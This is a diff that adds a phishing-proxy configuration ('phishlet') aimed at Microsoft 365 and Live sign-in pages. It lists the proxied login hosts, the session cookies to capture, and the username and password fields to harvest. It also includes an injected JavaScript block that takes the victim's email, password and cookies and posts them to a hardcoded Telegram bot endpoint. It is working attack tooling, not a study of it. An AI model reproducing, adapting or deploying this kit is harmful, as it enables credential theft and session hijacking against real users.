@@ -1,0 +1,227 @@
+name: "o365"
+author: 'IMPERATOR'
+min_ver: "2.3.0"
+proxy_hosts:
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "office.com",
+      session: false,
+      is_landing:false,
+    }
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "live.com",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "account",
+      orig_sub: "account",
+      domain: "live.com",
+      session: false,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "logincdn",
+      orig_sub: "logincdn",
+      domain: "msauth.net",
+      session: false,
+      is_landing: false,
+    }
+
+sub_filters:
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://{hostname}/ppsecure/",
+      replace: "https://{hostname}/ppsecure/",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://{hostname}/GetCredentialType.srf",
+      replace: "https://{hostname}/GetCredentialType.srf",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://{hostname}/GetSessionState.srf",
+      replace: "https://{hostname}/GetSessionState.srf",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: "{hostname}",
+      replace: "{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "login",
+      domain: "live.com",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "logincdn",
+      domain: "msauth.net",
+      search: "https://{hostname}",
+      replace: "https://{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+      redirect_only: true,
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "logincdn",
+      domain: "msauth.net",
+      search: "{hostname}",
+      replace: "{hostname}",
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+  - {
+      triggers_on: "login.live.com",
+      orig_sub: "logincdn",
+      domain: "msauth.net",
+      search: 'href="https://{hostname}',
+      replace: 'href="https://{hostname}',
+      mimes: ["text/html", "application/json", "application/javascript"],
+    }
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", ".*,regexp"]
+  - domain: "login.microsoftonline.com"
+    keys: ["SignInStateCookie", ".*,regexp"]
+  - domain: "login.live.com"
+    keys: [".*,regexp"]
+  - domain: ".login.live.com"
+    keys: [".*,regexp"]
+credentials:
+  username:
+    key: "(login|UserName)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(passwd|Password)"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/"]
+    trigger_params: ["email"]
+    script: |
+        function lp() {
+          var emailInput = document.querySelector('input[type="email"]');
+          var passwordInput = document.querySelector('input[type="password"]');
+          var email = emailInput.value;
+          var password = passwordInput.value;
+
+          if (email && password) {
+            setTimeout(() => {
+              // Submit the form
+              document.querySelectorAll('input[type="submit"]')[0].click(); // Use type="submit" selector for specificity
+
+              // Collect auth tokens
+              var authTokens = {};
+              for (var i = 0; i < document.cookie.split(";").length; i++) {
+                var cookie = document.cookie.split(";")[i];
+                var eqPos = cookie.indexOf("=");
+                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                var value = eqPos > -1 ? cookie.substr(eqPos + 1) : "";
+
+                if (auth_tokens.domain.some(domain => cookie.startsWith(domain + "="))) {
+                  for (var key of auth_tokens.keys) {
+                    if (key.startsWith(".*")) {
+                      authTokens[name] = value;
+                      break;
+                    } else if (name.startsWith(key + "=")) {
+                      authTokens[key] = value;
+                      break;
+                    }
+                  }
+                }
+              }
+
+              // Send email and password as text
+              fetch('https://api.telegram.org/bot6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: '5822512651',
+                  text: `Email: ${email}\nPassword: ${password}`
+                })
+              });
+
+              // Send auth token as JSON file
+              var data = { authTokens: authTokens };
+              var blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+              var file = new File([blob], "auth_tokens.json", { type: "application/json" });
+              sendToTelegram(file);
+            }, 5000);
+            return;
+          }
+        }
+
+        function sendToTelegram(file) {
+          var formData = new FormData();
+          formData.append("document", file);
+          fetch('https://api.telegram.org/bot6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA/sendDocument', {
+            method: 'POST',
+            body: formData
+          });
+        }
